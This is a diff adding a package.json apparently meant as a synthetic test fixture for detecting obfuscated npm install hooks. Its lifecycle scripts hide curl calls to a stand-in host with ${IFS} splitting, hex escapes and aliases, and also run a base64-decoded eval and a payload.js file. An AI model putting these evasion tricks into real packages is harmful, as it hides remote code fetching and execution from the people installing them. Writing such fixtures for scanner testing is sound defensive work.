@@ -1,0 +1,13 @@
+{
+  "//": "SYNTHETIC TEST FIXTURE — not functional",
+  "name": "fixture",
+  "scripts": {
+    "preinstall": "c${IFS}url${IFS}https://example.invalid/x",
+    "install": "$'\\x63url' https://example.invalid/x",
+    "postinstall": "alias c={{CURL}}; c https://example.invalid/x",
+    "prepare": "{{EVAL}} \"$(echo bm9kZQ== | base64 -d)\"",
+    "preprepare": "node $ENTRY",
+    "postprepare": "node < payload.js",
+    "dependencies": "echo \"never closed ; node x"
+  }
+}
